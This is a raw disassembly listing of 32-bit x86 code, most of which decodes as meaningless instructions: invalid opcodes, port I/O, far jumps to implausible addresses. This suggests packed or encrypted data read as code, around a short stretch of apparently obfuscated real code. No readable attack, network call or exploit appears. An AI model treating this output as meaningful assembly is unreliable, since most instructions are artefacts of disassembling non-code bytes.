  40ab33:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ab34:	out    0xa7,eax
  40ab36:	faddp  st(2),st
  40ab38:	and    ecx,DWORD PTR ds:0x68ca33a7
  40ab3e:	sub    eax,0xa25f16a2
  40ab43:	icebp  
  40ab44:	fdivr  st,st(2)
  40ab46:	dec    edx
  40ab47:	mov    ebp,0xc0b467e5
  40ab4c:	or     ecx,ebp
  40ab4e:	fsubr  QWORD PTR [ebx]
  40ab50:	dec    ebp
  40ab51:	push   edi
  40ab52:	mov    ecx,0xf18c4196
  40ab57:	xor    al,0x2f
  40ab59:	add    DWORD PTR [ebx-0xe9d9c7f],0xfffffff0
  40ab60:	dec    ebp
  40ab61:	call   DWORD PTR [ecx+0x6f]
  40ab64:	xor    ch,BYTE PTR [eax+eiz*8+0x44355bb0]
  40ab6b:	pop    eax
  40ab6c:	cmp    dl,dl
  40ab6e:	pop    ecx
  40ab6f:	xor    dl,BYTE PTR [edi+ebp*2-0x346ffcdd]
  40ab76:	cmp    DWORD PTR [eax+edx*2+0x47359f0a],0xc46b0169
  40ab81:	xchg   ebx,eax
  40ab82:	int    0xe8
  40ab84:	or     bh,ah
  40ab86:	aas    
  40ab87:	in     eax,dx
  40ab88:	int3   
  40ab89:	retf   0xa2f9
  40ab8c:	frstor [ecx+0x41b3049a]
  40ab92:	mul    DWORD PTR [ebx+eax*2]
  40ab95:	pop    esp
  40ab96:	xchg   esp,eax
  40ab97:	fistp  WORD PTR [ebx]
  40ab99:	(bad)  
  40ab9a:	scas   al,BYTE PTR es:[edi]
  40ab9b:	pop    es
  40ab9c:	xor    edx,DWORD PTR [edi+ebx*8+0x19]
  40aba0:	ds dec edi
  40aba2:	loope  0x40ab59
  40aba4:	nop
  40aba5:	hlt    
  40aba6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aba7:	push   esi
  40aba8:	dec    edi
  40aba9:	fdiv   DWORD PTR [edi*8-0x15c1bda5]
  40abb0:	rol    BYTE PTR ds:0x584b55ea,cl
  40abb6:	lea    esi,[edi]
  40abb8:	or     BYTE PTR cs:[esi-0x53],ah
  40abbc:	imul   ebp,DWORD PTR [esp+edi*1+0x2f2e94dd],0xb8fea367
  40abc7:	mov    ds:0x86638de2,al
  40abcc:	out    0x50,eax
  40abce:	test   DWORD PTR [eax-0x75c6aa9b],eax
  40abd4:	ds popa 
  40abd6:	hlt    
  40abd7:	jp     0x40ab90
  40abd9:	fwait
  40abda:	test   DWORD PTR [ebp+0x28],ebx
  40abdd:	ret    
  40abde:	mov    cl,0xaf
  40abe0:	ret    
  40abe1:	popf   
  40abe2:	dec    edx
  40abe3:	sbb    edx,DWORD PTR [eax+eax*1-0x5f049dcc]
  40abea:	(bad)  
  40abec:	pop    esp
  40abed:	inc    esp
  40abee:	push   edi
  40abef:	jnp    0x40ac25
  40abf1:	in     al,dx
  40abf2:	js     0x40ac1d
  40abf4:	cmp    al,0xaa
  40abf6:	lods   al,BYTE PTR ds:[esi]
  40abf7:	xor    bl,al
  40abf9:	jle    0x40abe3
  40abfb:	in     al,dx
  40abfc:	mov    al,ds:0x375995a7
  40ac01:	pop    edx
  40ac02:	xchg   ecx,eax
  40ac03:	dec    eax
  40ac04:	cmp    BYTE PTR [esi+0x277bac7a],ch
  40ac0a:	cmp    eax,0x5ecf7896
  40ac0f:	in     eax,dx
  40ac10:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ac11:	cmp    BYTE PTR [edx],cl
  40ac13:	sar    DWORD PTR [ecx],0x0
  40ac16:	inc    esp
  40ac17:	cmp    eax,0x19ccb2c6
  40ac1c:	aad    0xdd
  40ac1e:	sub    eax,0xc56d44c1
  40ac23:	lods   eax,DWORD PTR ds:[esi]
  40ac24:	pop    eax
  40ac25:	loopne 0x40ac27
  40ac27:	xor    BYTE PTR [edi],dh
  40ac29:	sahf   
  40ac2a:	or     DWORD PTR [esi],edi
  40ac2c:	inc    edx
  40ac2d:	xchg   ebx,eax
  40ac2e:	das    
  40ac2f:	mov    dh,0xb9
  40ac31:	mov    gs,WORD PTR [edi-0x60]
  40ac34:	xor    eax,0x8154a976
  40ac39:	fdivr  QWORD PTR [edi]
  40ac3b:	pop    ss
  40ac3c:	adc    eax,0xaa17003e
  40ac41:	mov    dh,0x7d
  40ac43:	sub    eax,0xf3b60706
  40ac48:	jmp    FWORD PTR [esi+0x6132fd2]
  40ac4e:	add    DWORD PTR [edx],0xc6e573ef
  40ac54:	add    BYTE PTR [esi],bh
  40ac56:	out    dx,al
  40ac57:	mov    ch,0xfe
  40ac59:	add    BYTE PTR [ebx],al
  40ac5b:	adc    edx,ebp
  40ac5d:	test   DWORD PTR [edx],esp
  40ac5f:	mov    dl,BYTE PTR [ecx-0x222e8cf]
  40ac65:	and    ah,BYTE PTR [ebx]
  40ac67:	mov    edi,0xfd11480c
  40ac6c:	or     BYTE PTR [edi+0x4b],dh
  40ac6f:	lock cmp DWORD PTR [ebp-0x77],edi
  40ac73:	in     eax,dx
  40ac74:	pop    edx
  40ac75:	xor    al,0xc8
  40ac77:	ret    0x24a6
  40ac7a:	xchg   esi,eax
  40ac7b:	sbb    DWORD PTR [ebp+eiz*2-0x3d],esi
  40ac7f:	mov    bh,0x6
  40ac81:	rcl    BYTE PTR [ebp+0x72],cl
  40ac84:	fwait
  40ac85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac86:	in     eax,dx
  40ac87:	sub    bh,ah
  40ac89:	jmp    0xe4a188f2
  40ac8e:	dec    ecx
  40ac8f:	lahf   
  40ac90:	inc    ebx
  40ac91:	mov    ss,WORD PTR [bx+si+0x7694]
  40ac96:	pop    edi
  40ac97:	mov    esi,0x7de38607
  40ac9c:	cld    
  40ac9d:	push   eax
  40ac9e:	gs xchg edi,eax
  40aca0:	or     ebp,ecx
  40aca2:	sar    esp,1
  40aca4:	or     edx,DWORD PTR [ebp+0x64cac21c]
  40acaa:	fimul  WORD PTR [edi+esi*8+0x14]
  40acae:	pop    ebx
  40acaf:	dec    edi
  40acb0:	scas   eax,DWORD PTR es:[edi]
  40acb1:	xor    BYTE PTR [edi+0x40],bh
  40acb4:	into   
  40acb5:	adc    esi,DWORD PTR [ecx-0x4727fb63]
  40acbb:	mov    al,0x12
  40acbd:	fwait
  40acbe:	sub    eax,0xe3e0da2b
  40acc3:	scas   eax,DWORD PTR es:[edi]
  40acc4:	out    0x56,eax
  40acc6:	dec    DWORD PTR [edx]
  40acc8:	mov    edi,0x3855ea05
  40accd:	xchg   esi,eax
  40acce:	aad    0x1b
  40acd0:	fld    QWORD PTR [ebx+0x45]
  40acd3:	es push ds
  40acd5:	xchg   edx,eax
  40acd6:	push   ecx
  40acd7:	add    al,0xec
  40acd9:	xchg   DWORD PTR [esi],edi
  40acdb:	lds    esi,FWORD PTR [edx+0x32]
  40acde:	std    
  40acdf:	pusha  
  40ace0:	aas    
  40ace1:	sbb    al,0xfe
  40ace3:	or     al,0x4d
  40ace5:	add    ebp,DWORD PTR [ebp-0x2bafac4a]
  40aceb:	mov    ch,0x16
  40aced:	sub    BYTE PTR ds:0xd14b11d4,bh
  40acf3:	cli    
  40acf4:	sub    eax,0xd73ab84b
  40acf9:	mov    edi,edi
  40acfb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acfc:	or     eax,0x41a7fbdf
  40ad01:	jge    0x40aca9
  40ad03:	xor    edi,ebp
  40ad05:	call   0xc8818443
  40ad0a:	xchg   edi,eax
  40ad0b:	bound  esi,QWORD PTR [eax]
  40ad0d:	in     eax,0xf2
  40ad0f:	(bad)  
  40ad10:	retf   
  40ad11:	dec    esi
  40ad12:	or     al,0x10
  40ad14:	mov    ds:0x80576145,eax
  40ad19:	inc    eax
  40ad1a:	mov    ?,WORD PTR [esi+0x7d]
  40ad1d:	pop    ebp
  40ad1e:	sbb    esi,DWORD PTR [eax+edx*8-0x17f55501]
  40ad25:	cld    
  40ad26:	or     eax,0xcf4be690
  40ad2b:	and    al,0x5
  40ad2d:	lahf   
  40ad2e:	and    eax,edi
  40ad30:	ret    0x41d
  40ad33:	mov    ds:0xa8062535,eax
  40ad38:	sbb    al,0x85
  40ad3a:	mov    ds:0x7f7064db,eax
  40ad3f:	ret    
  40ad40:	jge    0x40ad69
  40ad42:	das    
  40ad43:	mov    eax,ds:0x8e226de8
  40ad48:	cmp    ecx,DWORD PTR [eax]
  40ad4a:	cmc    
  40ad4b:	fcom   DWORD PTR [edx]
  40ad4d:	add    al,0xda
  40ad4f:	sub    DWORD PTR [ecx+0x2b1d5b34],edx
  40ad55:	cdq    
  40ad56:	pop    edx
  40ad57:	(bad)  
  40ad59:	jecxz  0x40ace2
  40ad5b:	lods   al,BYTE PTR ds:[esi]
  40ad5c:	test   eax,0x3fe2949a
  40ad61:	out    dx,al
  40ad62:	ja     0x40ad4b
  40ad64:	mov    eax,ds:0xd7025c7a
  40ad69:	push   0xad0501c4
  40ad6e:	dec    esp
  40ad6f:	aam    0xae
  40ad71:	das    
  40ad72:	push   0xbedbcf4a
  40ad77:	jno    0x40ad67
  40ad79:	sbb    BYTE PTR [ecx+0x5a],ah
  40ad7c:	xchg   BYTE PTR [ebp-0x1d5ac7c9],dl
  40ad82:	xchg   ebx,eax
  40ad83:	or     BYTE PTR ds:0x26091066,0xf7
  40ad8a:	mov    eax,ds:0x9f8a668d
  40ad8f:	jo     0x40ad11
  40ad91:	rcl    BYTE PTR ds:0x8c172f66,0xe6
  40ad98:	fist   WORD PTR [ecx]
  40ad9a:	shl    DWORD PTR [ecx],0xe7
  40ad9d:	cdq    
  40ad9e:	dec    ecx
  40ad9f:	mov    dl,0xc1
  40ada1:	leave  
  40ada2:	inc    ebx
  40ada3:	into   
  40ada4:	jo     0x40addd
  40ada6:	mov    al,0x6f
  40ada8:	call   0x55d8:0x400e59ab
  40adaf:	jl     0x40ae13
  40adb1:	dec    ecx
  40adb2:	cmp    DWORD PTR [ecx+0x50],eax
  40adb5:	or     ebp,edx
  40adb7:	jno    0x40ad54
  40adb9:	pop    es
  40adba:	inc    eax
  40adbb:	out    0xbf,al
  40adbd:	add    BYTE PTR [eax],ch
  40adbf:	lods   eax,DWORD PTR ds:[esi]
  40adc0:	in     eax,dx
  40adc1:	popf   
  40adc2:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  40adc4:	push   0x1a6053bc
  40adc9:	sub    al,0x3f
  40adcb:	mov    ?,WORD PTR [ebp*1+0x34b55920]
  40add2:	dec    ebp
  40add3:	sti    
  40add4:	fnstenv [edi+esi*4-0x7ab3ef26]
  40addb:	stos   BYTE PTR es:[edi],al
  40addc:	inc    BYTE PTR [ebp-0x7956be21]
  40ade2:	(bad)  
  40ade3:	jmp    0xcf22fd99
  40ade8:	sub    ch,BYTE PTR [ebp-0x5c]
  40adeb:	pop    eax
  40adec:	jg     0x40ad88
  40adee:	mov    ebp,0x112f874b
  40adf3:	scas   al,BYTE PTR es:[edi]
  40adf4:	lahf   
  40adf5:	mov    eax,0xb77484a4
  40adfa:	xor    bl,BYTE PTR [eax+0x466d0198]
  40ae00:	mov    cl,0x5a
  40ae02:	mov    cl,0x5
  40ae04:	xchg   edx,eax
  40ae05:	and    eax,0xbb1d39c2
  40ae0a:	sbb    ch,ah
  40ae0c:	jae    0x40ade8
  40ae0e:	mov    edx,0x1d97c803
  40ae13:	imul   ecx,DWORD PTR [ebx+eiz*2+0x61eb0c90],0xd3958df7
  40ae1e:	pop    DWORD PTR [edi+eiz*8]
  40ae21:	sub    al,0x27
  40ae23:	adc    ecx,edx
  40ae25:	imul   DWORD PTR [ebx-0x2f0b2a97]
  40ae2b:	mov    bh,dl
  40ae2d:	push   ebp
  40ae2e:	test   eax,0x8143b293
  40ae33:	push   0x593759df
  40ae38:	xchg   ebx,eax
  40ae39:	shl    BYTE PTR [ecx],0x52
  40ae3c:	add    edx,DWORD PTR [edi-0x76]
  40ae3f:	clc    
  40ae40:	repz add eax,0xe463c5cc
  40ae46:	dec    ebx
  40ae47:	push   es
  40ae48:	push   ecx
  40ae49:	mov    DWORD PTR [ebp-0x20],0x6ec3
  40ae50:	xor    ecx,0x7405
  40ae56:	push   esi
  40ae57:	mov    DWORD PTR [ebp-0x1c],0x2a74
  40ae5e:	mov    DWORD PTR [ebp-0x10],0x2e2c
  40ae65:	push   0x5285
  40ae6a:	xor    ecx,0x324d
  40ae70:	mov    DWORD PTR [ebp-0xc],0x3d0a
  40ae77:	sbb    eax,ecx
  40ae79:	mov    eax,DWORD PTR [ebp-0x10]
  40ae7c:	cmp    DWORD PTR ds:0x4282cb,0x0
  40ae83:	mov    ecx,DWORD PTR ds:0x428293
  40ae89:	mov    ecx,0x7ccc
  40ae8e:	jmp    0x40af01
  40ae93:	mov    DWORD PTR ds:0x4283c7,edx
  40ae99:	movzx  ecx,BYTE PTR ds:0x4282ab
  40aea0:	cmp    DWORD PTR ds:0x4282cb,0x0
  40aea7:	ja     0x40aee7
  40aead:	push   0x309a
  40aeb2:	push   DWORD PTR [ebp-0x1c]
  40aeb5:	push   DWORD PTR [ebp-0x14]
  40aeb8:	push   0x4280fb
  40aebd:	call   DWORD PTR ds:0x428eb8
  40aec3:	mov    ecx,DWORD PTR ds:0x42834b
  40aec9:	xor    DWORD PTR ds:0x42826f,ecx
  40aecf:	or     DWORD PTR ds:0x4283bb,ecx
  40aed5:	or     DWORD PTR ds:0x4282d3,ecx
  40aedb:	mov    ecx,DWORD PTR ds:0x4282df
  40aee1:	adc    DWORD PTR ds:0x4282a7,ecx
  40aee7:	xor    ecx,ecx
  40aee9:	or     ecx,DWORD PTR ds:0x4281a3
  40aeef:	adc    ecx,DWORD PTR ds:0x4283c7
  40aef5:	mov    DWORD PTR ds:0x4281a3,ecx
  40aefb:	and    ecx,0x2e4b
  40af01:	mov    ecx,DWORD PTR [ebp-0xc]
  40af04:	push   0x712c
  40af09:	adc    DWORD PTR ds:0x4283c3,0x428337
  40af13:	push   ecx
  40af14:	and    DWORD PTR ds:0x4281a3,0x72a4
  40af1e:	jmp    0x40b314
  40af23:	xchg   ecx,eax
  40af24:	sahf   
  40af25:	push   0x5e4f260e
  40af2a:	push   ds
  40af2b:	(bad)  
  40af2c:	fist   WORD PTR [edi-0x56]
  40af2f:	jnp    0x40af70
  40af31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40af32:	mov    esp,0x18181bb5
  40af37:	outs   dx,BYTE PTR ds:[esi]
  40af38:	adc    bl,BYTE PTR [eax]
  40af3a:	sbb    cl,bh
  40af3c:	ret    
  40af3d:	push   edx
  40af3e:	loope  0x40afbf
  40af40:	aad    0xe1
  40af42:	xlat   BYTE PTR ds:[ebx]
  40af43:	mov    edi,0xb8cb3054
  40af48:	ret    
  40af49:	leave  
  40af4a:	outs   dx,DWORD PTR ds:[esi]
  40af4b:	cmp    ecx,DWORD PTR [ebx-0x5f49a9a3]
  40af51:	aad    0xba
  40af53:	fs mov esp,0x10ac5fb4
  40af59:	neg    BYTE PTR [esi+0x6d359bc0]
  40af5f:	nop
  40af60:	dec    ebp
  40af61:	push   eax
  40af62:	in     eax,dx
  40af63:	inc    esp
  40af64:	test   BYTE PTR [edx],al
  40af66:	push   esi
  40af67:	add    esi,DWORD PTR [ebp+ebp*1-0x71]
  40af6b:	test   al,0x57
  40af6d:	xchg   ecx,eax
  40af6e:	(bad)  
  40af6f:	data16 and BYTE PTR [ebp-0x79],0x76
  40af74:	ss adc al,al
  40af77:	ds xchg edi,eax
  40af79:	pop    ecx
  40af7a:	adc    eax,0x8c5ca5ab
  40af7f:	popa   
  40af80:	mov    ebp,esp
  40af82:	call   0xb56f96f0
  40af87:	mov    DWORD PTR [edx],0x74419d36
  40af8d:	in     al,dx
  40af8e:	popa   
  40af8f:	xchg   esi,eax
  40af90:	push   eax
  40af91:	lods   eax,DWORD PTR ds:[esi]
  40af92:	bound  esi,QWORD PTR [esi+0x91aa74a]
  40af98:	add    al,0x65
  40af9a:	inc    esi
  40af9b:	mov    edi,0xc8da2d93
  40afa0:	out    0x65,al
  40afa2:	retf   0x2131
  40afa5:	jge    0x40af95
  40afa7:	adc    ah,BYTE PTR ds:0x7be7df8c
  40afad:	aaa    
  40afae:	inc    ebx
  40afaf:	fdiv   QWORD PTR [ebp-0x34]
  40afb2:	push   edx
  40afb3:	call   0x3147:0xff0b4a2b
  40afba:	push   cs
  40afbb:	dec    esi
  40afbc:	mov    ebx,DWORD PTR [ebx+0x19]
  40afbf:	jecxz  0x40af83
  40afc1:	sbb    ah,BYTE PTR [edx+edx*1-0x7b575dda]
  40afc8:	shl    DWORD PTR [ecx],cl
  40afca:	cld    
  40afcb:	and    DWORD PTR [ecx],eax
  40afcd:	xchg   edx,eax
  40afce:	add    BYTE PTR [ebx+0x38],al
  40afd1:	xor    al,0xff
  40afd3:	cld    
  40afd4:	ds xchg ebx,eax
  40afd6:	cwde   
  40afd7:	jb     0x40afa6
  40afd9:	pop    ds
  40afda:	(bad)  
  40afdb:	or     WORD PTR [eax],dx
  40afde:	mov    ds:0x2ae99edd,al
  40afe3:	cdq    
  40afe4:	call   0x17f8cce9
  40afe9:	mov    ch,0xbb
  40afeb:	adc    dh,ah
  40afed:	stc    
  40afee:	gs pusha 
  40aff0:	cmp    esp,DWORD PTR [eax+0x14977f28]
  40aff6:	test   DWORD PTR [edx+0x58336c95],ebx
  40affc:	add    esp,ecx
  40affe:	or     eax,0x69a29fc6
  40b003:	sub    eax,0xeab4e117
  40b008:	gs dec ebx
  40b00a:	adc    eax,0xe23c3b7f
  40b00f:	fisttp DWORD PTR [ebx-0x1f]
  40b012:	into   
  40b013:	pop    es
  40b014:	mov    eax,edi
  40b016:	mov    bh,0xad
  40b018:	adc    eax,DWORD PTR [ebp-0x74aa237c]
  40b01e:	popf   
  40b01f:	mov    al,ds:0xb2a73d9a
  40b024:	les    ecx,FWORD PTR [esi]
  40b026:	mov    esp,0x25084b6e
  40b02b:	out    0xef,al
  40b02d:	or     ebp,0xd
  40b030:	retf   
  40b031:	xchg   ebx,eax
  40b032:	pushf  
  40b033:	cdq    
  40b034:	push   esi
  40b035:	arpl   WORD PTR [edx-0x70],bp
  40b038:	pop    bx
  40b03a:	das    
  40b03b:	test   BYTE PTR [edx+eiz*4+0x6c],ch
  40b03f:	fcom   DWORD PTR [ebp+edi*8-0x19f5ba8d]
  40b046:	sbb    dh,BYTE PTR [edx+eiz*4-0x75d0a806]
  40b04d:	sbb    al,0x1e
  40b04f:	adc    BYTE PTR [edi+0xb],ah
  40b052:	adc    DWORD PTR [ecx+0x2f],ebp
  40b055:	adc    edi,DWORD PTR [edx]
  40b057:	sar    DWORD PTR [edi+edi*2-0x40],1
  40b05b:	fnsave [ebp-0x24]
  40b05e:	aad    0xcf
  40b060:	push   ecx
  40b061:	out    dx,al
  40b062:	out    0x2b,al
  40b064:	scas   eax,DWORD PTR es:[edi]
  40b065:	push   edx
  40b066:	dec    bl
  40b068:	rcr    eax,0x59
  40b06b:	add    ecx,DWORD PTR ds:0xf6361358
  40b071:	sub    BYTE PTR [esp+edx*8-0x31bda1e1],al
  40b078:	icebp  
  40b079:	sbb    DWORD PTR [ebp-0x6d],edx
  40b07c:	adc    eax,0x8eaa368c
  40b081:	sub    DWORD PTR [eax],0x821637e4
  40b087:	xchg   esp,eax
  40b088:	mov    esi,0x76541d59
  40b08d:	or     eax,0x31c05fc
  40b092:	outs   dx,DWORD PTR ds:[esi]
  40b093:	dec    edi
  40b094:	mov    ?,WORD PTR [ecx]
  40b096:	sbb    esi,ebp
  40b098:	inc    edx
  40b099:	add    DWORD PTR [eax-0x17efa743],edi
  40b09f:	repnz inc ecx
  40b0a1:	popa   
  40b0a2:	or     eax,0xaeec72f9
  40b0a7:	push   ds
  40b0a8:	fldenv [edx-0x8fa3326]
  40b0ae:	and    bh,BYTE PTR [eax-0x5]
  40b0b1:	lea    edx,[esi-0x52]
  40b0b4:	rcr    DWORD PTR [esi+0x76],0x4e
  40b0b8:	cs jne 0x40b0cf
  40b0bb:	(bad)
  40b0bf:	mov    ah,0x26
  40b0c1:	push   ebx
  40b0c2:	xchg   dl,cl
  40b0c4:	push   es
  40b0c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b0c6:	fucomp st(3)
  40b0c8:	pop    esp
  40b0c9:	aam    0x98
  40b0cb:	sar    BYTE PTR [ebx-0x6f],1
  40b0ce:	aaa    
  40b0cf:	inc    edi
  40b0d0:	outs   dx,BYTE PTR ds:[esi]
  40b0d1:	sbb    DWORD PTR ds:0xfef2080a,eax
  40b0d7:	dec    edx
  40b0d8:	push   ecx
  40b0d9:	sub    ebp,DWORD PTR [ecx]
  40b0db:	pop    es
  40b0dc:	and    ebp,DWORD PTR [ecx+0x77e7ffa]
  40b0e2:	mov    ebp,0x24ee14d6
  40b0e7:	mov    bh,0xf9
  40b0e9:	in     eax,0xd8
  40b0eb:	ret    0xcbd3
  40b0ee:	dec    eax
  40b0ef:	xchg   BYTE PTR [ecx],dl
  40b0f1:	push   esp
  40b0f2:	xchg   BYTE PTR [esp+esi*2+0x4df776fd],bh
  40b0f9:	pop    eax
  40b0fa:	mov    ss,WORD PTR [ebp-0x1a]
  40b0fd:	xor    BYTE PTR [ecx],cl
  40b0ff:	out    dx,eax
  40b100:	jecxz  0x40b0e4
  40b102:	sbb    DWORD PTR [edx-0x29],eax
  40b105:	(bad)  
  40b106:	int3   
  40b107:	push   0xffffffe6
  40b109:	ret    0xd426
  40b10c:	push   ebx
  40b10d:	xor    al,0x47
  40b10f:	add    ch,cl
  40b111:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b112:	sbb    BYTE PTR [ebx],dh
  40b114:	jae    0x40b100
  40b116:	inc    esi
  40b117:	loop   0x40b0bf
  40b119:	or     DWORD PTR [eax+0x6faba484],ebp
  40b11f:	push   cs
  40b120:	sbb    eax,0x2689cbb1
  40b125:	jne    0x40b141
  40b127:	je     0x40b0b3
  40b129:	xchg   esi,eax
  40b12a:	fwait
  40b12b:	iret   
  40b12c:	loopne 0x40b0e3
  40b12e:	mov    esp,0x1651ff9e
  40b133:	fcom   QWORD PTR [eax+edi*4]
  40b136:	inc    ebp
  40b137:	mov    eax,ds:0xc02518f7
  40b13c:	enter  0xd736,0x53
  40b140:	sub    BYTE PTR [esi],bl
  40b142:	push   ds
  40b143:	sub    edx,esp
  40b145:	xor    DWORD PTR [eax+0xe7094ec],ebp
  40b14b:	add    eax,0xc2a52a8a
  40b150:	out    dx,eax
  40b151:	push   eax
  40b152:	sahf   
  40b153:	push   edx
  40b154:	mov    gs:0xff23677e,al
  40b15a:	pop    ecx
  40b15b:	enter  0xda6a,0x5e
  40b15f:	int3   
  40b160:	mov    ebp,ds
  40b162:	push   esp
  40b163:	retf   0xb61d
  40b166:	adc    BYTE PTR [ecx+0x5e],cl
  40b169:	fist   DWORD PTR [eax+0x25]
  40b16c:	jnp    0x40b0f4
  40b16e:	pop    ds
  40b16f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b170:	es mov edx,0x8991899a
  40b176:	outs   dx,BYTE PTR ds:[esi]
  40b177:	daa    
  40b178:	xchg   ecx,eax
  40b179:	sub    cl,0x3
  40b17c:	popf   
  40b17d:	xor    eax,0x1fd26f72
  40b182:	loope  0x40b15a
  40b184:	(bad)  
  40b185:	scas   eax,DWORD PTR es:[edi]
  40b186:	sbb    eax,0x5635ee65
  40b18b:	mov    DWORD PTR [edi+0x4f],ecx
  40b18e:	inc    ebp
  40b18f:	add    ch,0xdb
  40b192:	stos   DWORD PTR es:[edi],eax
  40b193:	adc    esp,esi
  40b195:	push   ss
  40b196:	lods   al,BYTE PTR ds:[esi]
  40b197:	sub    al,0xa1
  40b199:	ins    BYTE PTR es:[edi],dx
  40b19a:	mov    DWORD PTR [ebx+edi*4-0x3b01280d],ebx
  40b1a1:	mov    edi,0xb3dffca8
  40b1a6:	pop    eax
  40b1a7:	loopne 0x40b137
  40b1a9:	popf   
  40b1aa:	add    ebp,DWORD PTR [ebx]
  40b1ac:	lods   al,BYTE PTR ds:[esi]
  40b1ad:	add    al,0xad
  40b1af:	xchg   ebp,eax
  40b1b0:	xchg   BYTE PTR [ecx-0x1a],cl
  40b1b3:	push   esi
  40b1b4:	mov    ah,0x41
  40b1b6:	imul   edx,esi,0x44f903fd
  40b1bc:	cmp    edi,DWORD PTR [ebp+0x53a4616f]
  40b1c2:	in     eax,dx
  40b1c3:	mov    WORD PTR [eax+0x37],ss
  40b1c6:	xchg   esi,eax
  40b1c7:	cdq    
  40b1c8:	xchg   DWORD PTR [ebx],edx
  40b1ca:	out    dx,al
  40b1cb:	dec    ecx
  40b1cc:	sti    
  40b1cd:	inc    esp
  40b1ce:	not    DWORD PTR [esi]
  40b1d0:	std    
  40b1d1:	push   ss
  40b1d2:	cmp    DWORD PTR [ebp-0x63],eax
  40b1d5:	cmp    al,0xbc
  40b1d7:	jle    0x40b1ab
  40b1d9:	xor    ah,BYTE PTR [ebp-0x19]
  40b1dc:	stos   BYTE PTR es:[edi],al
  40b1dd:	adc    ch,BYTE PTR [ebp+0x41749f5e]
  40b1e3:	jp     0x40b1a1
  40b1e5:	not    BYTE PTR [edi-0x3d]
  40b1e8:	(bad)  
  40b1e9:	adc    dh,BYTE PTR [eax+0x9253ad3]
  40b1ef:	sub    DWORD PTR [ebx],0x19
  40b1f2:	or     ah,BYTE PTR [edx+0x145cfe86]
  40b1f8:	push   0xa993cf91
  40b1fd:	(bad)  
  40b1fe:	mul    DWORD PTR [edi]
  40b200:	and    al,0x1f
  40b202:	cli    
  40b203:	push   es
  40b204:	dec    edi
  40b205:	xor    eax,0x88cefed0
  40b20a:	fcom   st(7)
  40b20c:	fld    TBYTE PTR [eax+0x778b7686]
  40b212:	fwait
  40b213:	dec    ebx
  40b214:	rol    esp,cl
  40b216:	xor    esp,DWORD PTR [edx+0x5e]
  40b219:	adc    BYTE PTR [ebx-0x45],dl
  40b21c:	mov    ecx,0xabe1cd9c
  40b221:	cmc    
  40b222:	pop    edx
  40b223:	enter  0xea86,0x1e
  40b227:	cmp    eax,0xed1b4b39
  40b22c:	scas   al,BYTE PTR es:[edi]
  40b22d:	mov    esi,0xc680e9d0
  40b232:	dec    edi
  40b234:	sti    
  40b235:	call   0x8589c3c6
  40b23a:	jg     0x40b229
  40b23c:	test   eax,0x1a8a8efd
  40b241:	add    DWORD PTR [ebx-0x1b],0xffffffc3
  40b245:	xchg   esp,eax
  40b246:	in     eax,0xb0
  40b248:	and    eax,0x9bc36794
  40b24d:	imul   esi,DWORD PTR [esp+esi*4+0x24],0x3f
  40b252:	imul   edi,edx,0x6c
  40b255:	cmp    al,0x90
  40b257:	sub    al,0x8a
  40b259:	test   DWORD PTR [ecx-0x15],edi
  40b25c:	not    DWORD PTR [edx]
  40b25e:	in     eax,0x48
  40b260:	or     al,0xb1
  40b262:	mov    eax,ds:0x3d8d82b7
  40b267:	sub    al,BYTE PTR [ecx+0x44aab585]
  40b26d:	xchg   ebx,eax
  40b26e:	in     eax,0xb2
  40b270:	or     eax,0x4c96883d
  40b275:	add    bh,BYTE PTR [eax-0x78124a4b]
  40b27b:	mov    ecx,0x35edd8ad
  40b280:	adc    DWORD PTR [esi+0x67da2803],edx
  40b286:	data16 cld 
  40b288:	pop    ebx
  40b289:	sub    ebx,esi
  40b28b:	push   ds
  40b28c:	fs inc esi
  40b28e:	add    ebx,DWORD PTR [ecx]
  40b290:	nop
  40b291:	push   eax
  40b292:	add    BYTE PTR [ecx],bl
  40b294:	les    edi,FWORD PTR [edi+eax*2+0x4965012]
  40b29b:	cmc    
  40b29c:	dec    edx
  40b29d:	cmc    
  40b29e:	cwde   
  40b29f:	mov    bl,0x79
  40b2a1:	rcr    DWORD PTR [edi],0xcc
  40b2a4:	pop    eax
  40b2a5:	add    eax,DWORD PTR [ecx]
  40b2a7:	imul   edi,DWORD PTR [ecx+0x13ff6d31],0x37
  40b2ae:	cmp    cl,BYTE PTR [ebx]
  40b2b0:	push   edx
  40b2b1:	leave  
  40b2b2:	(bad)  
  40b2b3:	xor    BYTE PTR [esi],dh
  40b2b5:	cmp    esp,DWORD PTR [esi+eiz*8]
  40b2b8:	fimul  WORD PTR [ebx-0x347466e2]
  40b2be:	ins    BYTE PTR es:[edi],dx
  40b2bf:	mov    al,0x7
  40b2c1:	adc    al,BYTE PTR [edx+esi*2-0x65bfc8c1]
  40b2c8:	jge    0x40b335
  40b2ca:	(bad)  
  40b2cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b2cc:	and    cl,BYTE PTR [edx]
  40b2ce:	mov    al,ds:0x5343f586
  40b2d3:	cmp    ebx,DWORD PTR [eax+0x51]
  40b2d6:	xor    al,0x50
  40b2d8:	sbb    al,0xf8
  40b2da:	out    0x2e,eax
  40b2dc:	or     al,0x67
  40b2de:	mul    DWORD PTR [ecx-0x7d]
  40b2e1:	jne    0x40b275
  40b2e3:	add    eax,ebx
  40b2e5:	jo     0x40b344
  40b2e7:	int    0xc8
  40b2e9:	(bad)  
  40b2ea:	ficomp WORD PTR [edx-0x7d]
  40b2ed:	lods   eax,DWORD PTR ds:[esi]
  40b2ee:	lods   eax,DWORD PTR ds:[esi]
  40b2ef:	jge    0x40b2d3
  40b2f1:	popf   
  40b2f2:	inc    edx
  40b2f3:	loop   0x40b353
  40b2f5:	xchg   DWORD PTR [eax-0x2950820a],ebx
  40b2fb:	inc    edx
  40b2fc:	push   ebp
  40b2fd:	jo     0x40b280
  40b2ff:	sbb    ebp,DWORD PTR gs:[edi]
  40b302:	cmp    BYTE PTR [ecx-0x3bb2be66],dl
